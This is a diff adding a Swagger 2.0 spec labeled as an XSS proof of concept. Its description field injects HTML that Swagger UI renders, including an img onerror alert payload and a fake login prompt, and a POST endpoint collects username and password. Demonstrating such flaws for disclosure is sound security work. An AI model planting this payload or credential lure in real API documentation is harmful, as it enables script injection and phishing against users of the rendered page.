@@ -1,0 +1,40 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Login Page (XSS PoC)
+  description: |
+    <!-- XSS PoC via Swagger UI description field -->
+    <div class="login-form">
+      <h2 style="text-align:center;">Login Page</h2>
+      <p style="text-align:center; color: #888;">Please enter your credentials to continue.</p>
+      <img src="x" onerror="alert('XCYBOY XSS')">
+    </div>
+host: example.com
+basePath: /api
+schemes:
+  - https
+
+consumes:
+  - application/x-www-form-urlencoded
+produces:
+  - application/json
+
+paths:
+  /:
+    post:
+      summary: PoC endpoint (XSS test)
+      description: "Submit credentials (PoC only)"
+      parameters:
+        - name: username
+          in: formData
+          description: "Your username"
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: "Your password"
+          required: true
+          type: string
+      responses:
+        '200':
+          description: "Login successful (PoC)"
